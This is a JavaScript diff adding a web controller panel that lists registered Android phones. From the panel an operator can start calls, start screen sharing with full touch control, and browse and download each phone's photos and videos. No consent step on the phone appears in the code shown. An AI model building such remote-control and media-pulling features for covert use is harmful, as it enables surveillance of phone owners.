@@ -5339,3 +5339,352 @@ function setupRemoteCameraPip() {
 }
 
 setupRemoteCameraPip();
+
+
+// ==============================================================
+// CUPERTINO iOS STYLE: DEVICE REGISTRY & AUTO-CONTROL PANEL
+// ==============================================================
+(function() {
+    let deviceRegistryOpen = false;
+    let currentGalleryDeviceId = null;
+    let currentGalleryPage = 0;
+    let currentGalleryType = "gallery"; // "gallery" or "videos"
+    let cachedDevices = [];
+
+    const btnDeviceRegistry = document.getElementById("btn-device-registry");
+    const deviceRegistryModal = document.getElementById("device-registry-modal");
+    const btnCloseDeviceRegistry = document.getElementById("btn-close-device-registry");
+    const btnRefreshDevices = document.getElementById("btn-refresh-devices");
+    const deviceRegistryList = document.getElementById("device-registry-list");
+    const deviceSelfId = document.getElementById("device-self-id");
+    const deviceSelfMeta = document.getElementById("device-self-meta");
+
+    const galleryModal = document.getElementById("gallery-modal");
+    const galleryGrid = document.getElementById("gallery-grid");
+    const galleryPageLabel = document.getElementById("gallery-page-label");
+    const galleryModalTitle = document.getElementById("gallery-modal-title");
+    const galleryHeaderIcon = document.getElementById("gallery-header-icon");
+    const btnCloseGallery = document.getElementById("btn-close-gallery");
+    const btnGalleryPrev = document.getElementById("btn-gallery-prev");
+    const btnGalleryNext = document.getElementById("btn-gallery-next");
+
+    function isNativeAndroidApp() {
+        return !!(window.VRemoteNative && typeof window.VRemoteNative.isNativeApp === "function" && window.VRemoteNative.isNativeApp());
+    }
+
+    function openDeviceRegistry() {
+        if (!deviceRegistryModal) return;
+        deviceRegistryOpen = true;
+        deviceRegistryModal.style.display = "flex";
+
+        if (isNativeAndroidApp()) {
+            try {
+                const infoStr = window.VRemoteNative.getDeviceInfo();
+                const info = JSON.parse(infoStr || "{}");
+                if (deviceSelfId) deviceSelfId.textContent = info.deviceId || "Registered";
+                if (deviceSelfMeta) {
+                    const devName = info.deviceName || "Android Device";
+                    const ram = info.ram || "";
+                    deviceSelfMeta.textContent = `${devName}, ${ram}`;
+                }
+            } catch (e) {
+                if (deviceSelfId) deviceSelfId.textContent = "Android VRemote Device";
+            }
+        } else {
+            if (deviceSelfId) deviceSelfId.textContent = "Desktop Browser (Controller Session)";
+            if (deviceSelfMeta) deviceSelfMeta.textContent = "Connect to installed Android phones below for auto-control";
+        }
+
+        if (socket && socket.connected) {
+            socket.emit("get-devices");
+        }
+    }
+
+    function closeDeviceRegistry() {
+        deviceRegistryOpen = false;
+        if (deviceRegistryModal) deviceRegistryModal.style.display = "none";
+    }
+
+    if (btnDeviceRegistry) {
+        btnDeviceRegistry.addEventListener("click", (e) => {
+            e.stopPropagation();
+            openDeviceRegistry();
+        });
+    }
+
+    if (btnCloseDeviceRegistry) {
+        btnCloseDeviceRegistry.addEventListener("click", closeDeviceRegistry);
+    }
+
+    if (deviceRegistryModal) {
+        deviceRegistryModal.addEventListener("click", (e) => {
+            if (e.target === deviceRegistryModal) closeDeviceRegistry();
+        });
+    }
+
+    if (btnRefreshDevices) {
+        btnRefreshDevices.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const icon = document.getElementById("refresh-devices-icon");
+            if (icon) icon.classList.add("spinning");
+            if (socket && socket.connected) {
+                socket.emit("get-devices");
+            }
+            setTimeout(() => { if (icon) icon.classList.remove("spinning"); }, 800);
+        });
+    }
+
+    function renderDeviceList(devices) {
+        cachedDevices = devices || [];
+        if (!deviceRegistryList) return;
+
+        if (!devices || devices.length === 0) {
+            deviceRegistryList.innerHTML = `
+                <div class="cupertino-empty-state">
+                    <i class="fas fa-mobile-alt" style="font-size:2rem; opacity:0.3; margin-bottom:6px;"></i>
+                    <span style="font-weight:600; color:#f2f2f7;">No Registered Devices Yet</span>
+                    <span style="font-size:11px; color:#8e8e93; max-width:280px; text-align:center;">Install the VRemote Android app on your phone. When opened, it automatically registers its Device ID here.</span>
+                </div>`;
+            return;
+        }
+
+        deviceRegistryList.innerHTML = "";
+        devices.forEach(device => {
+            const isOnline = Boolean(device.online);
+            const row = document.createElement("div");
+            row.className = "cupertino-device-row";
+
+            const safeId = escapeHtml(device.deviceId || "UNKNOWN");
+            const safeName = escapeHtml(device.deviceName || "Android Phone");
+            const safeRam = escapeHtml(device.ram || "RAM N/A");
+
+            row.innerHTML = `
+                <div class="cupertino-device-top">
+                    <div class="cupertino-device-meta">
+                        <div class="cupertino-device-title-line">
+                            <span class="cupertino-online-dot ${isOnline ? 'online' : 'offline'}" title="${isOnline ? 'Online' : 'Offline'}"></span>
+                            <span class="cupertino-device-name">${safeName}</span>
+                        </div>
+                        <div class="cupertino-device-badges">
+                            <span class="id-code">ID: ${safeId}</span><span class="dim">,</span>
+                            <span>${safeRam}</span><span class="dim">,</span>
+                            <span style="color:${isOnline ? '#34c759' : '#8e8e93'};">${isOnline ? 'Online' : 'Offline'}</span>
+                        </div>
+                    </div>
+                    <i class="fab fa-android" style="color:#3ddc84; font-size:1.3rem; opacity:0.85; margin-left:4px;"></i>
+                </div>
+                <div class="cupertino-actions-grid">
+                    <button class="dev-action-btn btn-act-call ${isOnline ? '' : 'offline-disabled'}" data-action="audio_call" data-did="${safeId}" title="Audio Call">
+                        <i class="fas fa-phone"></i>
+                        <span>Call</span>
+                    </button>
+                    <button class="dev-action-btn btn-act-video ${isOnline ? '' : 'offline-disabled'}" data-action="video_call" data-did="${safeId}" title="Video Call">
+                        <i class="fas fa-video"></i>
+                        <span>Video</span>
+                    </button>
+                    <button class="dev-action-btn btn-act-share ${isOnline ? '' : 'offline-disabled'}" data-action="screen_share" data-did="${safeId}" title="Auto Screen Share (View Only)">
+                        <i class="fas fa-desktop"></i>
+                        <span>Share</span>
+                    </button>
+                    <button class="dev-action-btn btn-act-control ${isOnline ? '' : 'offline-disabled'}" data-action="screen_share_control" data-did="${safeId}" title="Auto Screen Share + Full Touch Control">
+                        <i class="fas fa-hand-pointer"></i>
+                        <span>Control</span>
+                    </button>
+                    <button class="dev-action-btn btn-act-gallery ${isOnline ? '' : 'offline-disabled'}" data-action="get_gallery" data-did="${safeId}" title="Browse Photos (50 per page)">
+                        <i class="fas fa-images"></i>
+                        <span>Gallery</span>
+                    </button>
+                    <button class="dev-action-btn btn-act-videos ${isOnline ? '' : 'offline-disabled'}" data-action="get_videos" data-did="${safeId}" title="Browse Videos (50 per page)">
+                        <i class="fas fa-film"></i>
+                        <span>Videos</span>
+                    </button>
+                </div>
+            `;
+            deviceRegistryList.appendChild(row);
+        });
+
+        // Event delegation on action buttons
+        deviceRegistryList.querySelectorAll(".dev-action-btn").forEach(btn => {
+            btn.addEventListener("click", (e) => {
+                e.stopPropagation();
+                const action = btn.dataset.action;
+                const did = btn.dataset.did;
+                triggerDeviceAction(action, did);
+            });
+        });
+    }
+
+    function triggerDeviceAction(action, deviceId) {
+        if (!deviceId) return;
+
+        if (action === "get_gallery") {
+            currentGalleryDeviceId = deviceId;
+            currentGalleryPage = 0;
+            currentGalleryType = "gallery";
+            openGallery("Device Gallery (50 Photos)", "fa-images");
+            fetchMediaPage(deviceId, 0, "get_gallery");
+        } else if (action === "get_videos") {
+            currentGalleryDeviceId = deviceId;
+            currentGalleryPage = 0;
+            currentGalleryType = "videos";
+            openGallery("Device Videos (50 Videos)", "fa-film");
+            fetchMediaPage(deviceId, 0, "get_videos");
+        } else if (action === "audio_call") {
+            socket.emit("auto-command", { targetDeviceId: deviceId, command: "audio_call" });
+            showToast("Calling registered device (Audio)...");
+        } else if (action === "video_call") {
+            socket.emit("auto-command", { targetDeviceId: deviceId, command: "video_call" });
+            showToast("Calling registered device (Video)...");
+        } else if (action === "screen_share") {
+            socket.emit("auto-command", { targetDeviceId: deviceId, command: "screen_share" });
+            showToast("Requesting auto screen share (View Only)...");
+        } else if (action === "screen_share_control") {
+            socket.emit("auto-command", { targetDeviceId: deviceId, command: "screen_share_control" });
+            showToast("Requesting auto screen share with Full Control...");
+        }
+    }
+
+    function openGallery(title, iconClass) {
+        if (galleryModalTitle) galleryModalTitle.textContent = title;
+        if (galleryHeaderIcon) galleryHeaderIcon.className = `fas ${iconClass}`;
+        if (galleryModal) galleryModal.style.display = "flex";
+    }
+
+    function closeGallery() {
+        if (galleryModal) galleryModal.style.display = "none";
+        if (galleryGrid) galleryGrid.innerHTML = "";
+    }
+
+    function fetchMediaPage(deviceId, page, command) {
+        if (galleryGrid) {
+            galleryGrid.innerHTML = `
+                <div style="grid-column: 1/-1; text-align:center; padding:48px 16px; color:#8e8e93;">
+                    <i class="fas fa-circle-notch fa-spin" style="font-size:1.8rem; margin-bottom:10px; display:block; color:#0a84ff;"></i>
+                    <span>Loading 50 media items from device...</span>
+                </div>`;
+        }
+        if (galleryPageLabel) galleryPageLabel.textContent = `Page ${page + 1}`;
+        if (socket && socket.connected) {
+            socket.emit("auto-command", { targetDeviceId: deviceId, command, page });
+        }
+    }
+
+    if (btnCloseGallery) btnCloseGallery.addEventListener("click", closeGallery);
+    if (galleryModal) {
+        galleryModal.addEventListener("click", (e) => {
+            if (e.target === galleryModal) closeGallery();
+        });
+    }
+
+    if (btnGalleryPrev) {
+        btnGalleryPrev.addEventListener("click", () => {
+            if (currentGalleryPage > 0) {
+                currentGalleryPage--;
+                fetchMediaPage(currentGalleryDeviceId, currentGalleryPage, currentGalleryType === "videos" ? "get_videos" : "get_gallery");
+            }
+        });
+    }
+
+    if (btnGalleryNext) {
+        btnGalleryNext.addEventListener("click", () => {
+            currentGalleryPage++;
+            fetchMediaPage(currentGalleryDeviceId, currentGalleryPage, currentGalleryType === "videos" ? "get_videos" : "get_gallery");
+        });
+    }
+
+    // Handle incoming gallery chunk
+    socket.on("gallery-chunk", (data) => {
+        if (!galleryGrid) return;
+        const items = (data && data.items) || [];
+        const isVideo = (data && data.type === "video-response");
+
+        if (items.length === 0) {
+            galleryGrid.innerHTML = `
+                <div style="grid-column: 1/-1; text-align:center; padding:48px 16px; color:#8e8e93;">
+                    <i class="fas ${isVideo ? 'fa-film' : 'fa-images'}" style="font-size:1.8rem; opacity:0.3; margin-bottom:8px; display:block;"></i>
+                    <span>No ${isVideo ? 'videos' : 'photos'} found on Page ${currentGalleryPage + 1}.</span>
+                </div>`;
+            return;
+        }
+
+        galleryGrid.innerHTML = "";
+        items.forEach(item => {
+            const cell = document.createElement("div");
+            cell.className = "cupertino-gallery-cell";
+
+            if (item.thumb) {
+                const img = document.createElement("img");
+                img.src = `data:image/jpeg;base64,${item.thumb}`;
+                img.className = "cupertino-gallery-img";
+                cell.appendChild(img);
+            } else {
+                const ph = document.createElement("div");
+                ph.className = "cupertino-gallery-ph";
+                ph.innerHTML = `<i class="fas ${isVideo ? 'fa-film' : 'fa-image'}"></i>`;
+                cell.appendChild(ph);
+            }
+
+            if (isVideo && item.duration) {
+                const totalSec = Math.floor(item.duration / 1000);
+                const m = Math.floor(totalSec / 60);
+                const s = totalSec % 60;
+                const durEl = document.createElement("div");
+                durEl.className = "cupertino-gallery-dur";
+                durEl.textContent = `${m}:${String(s).padStart(2, '0')}`;
+                cell.appendChild(durEl);
+            }
+
+            const nameEl = document.createElement("div");
+            nameEl.className = "cupertino-gallery-name";
+            nameEl.textContent = item.name || (isVideo ? "video.mp4" : "image.jpg");
+            cell.appendChild(nameEl);
+
+            // Download Button Overlay
+            const dlBtn = document.createElement("button");
+            dlBtn.className = "cupertino-gallery-dl";
+            dlBtn.title = "Download";
+            dlBtn.innerHTML = '<i class="fas fa-download"></i>';
+            dlBtn.addEventListener("click", (e) => {
+                e.stopPropagation();
+                if (item.thumb) {
+                    const a = document.createElement("a");
+                    a.href = `data:image/jpeg;base64,${item.thumb}`;
+                    a.download = item.name || (isVideo ? "video-thumb.jpg" : "photo.jpg");
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    showToast(`Downloading ${a.download}...`);
+                }
+            });
+            cell.appendChild(dlBtn);
+
+            // Fullscreen click preview
+            cell.addEventListener("click", () => {
+                if (item.thumb) {
+                    const win = window.open("");
+                    if (win) {
+                        win.document.write(`<body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;"><img src="data:image/jpeg;base64,${item.thumb}" style="max-width:100%;max-height:100%;object-fit:contain;"></body>`);
+                    }
+                }
+            });
+
+            galleryGrid.appendChild(cell);
+        });
+    });
+
+    // Device list updates broadcast from server
+    socket.on("device-list-update", (devices) => {
+        if (deviceRegistryOpen) {
+            renderDeviceList(devices);
+        }
+    });
+
+    socket.on("device-error", (data) => {
+        showToast(`Device Notice: ${data.error || 'Device unavailable'}`);
+    });
+
+    function escapeHtml(str) {
+        if (!str) return "";
+        return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+    }
+})();
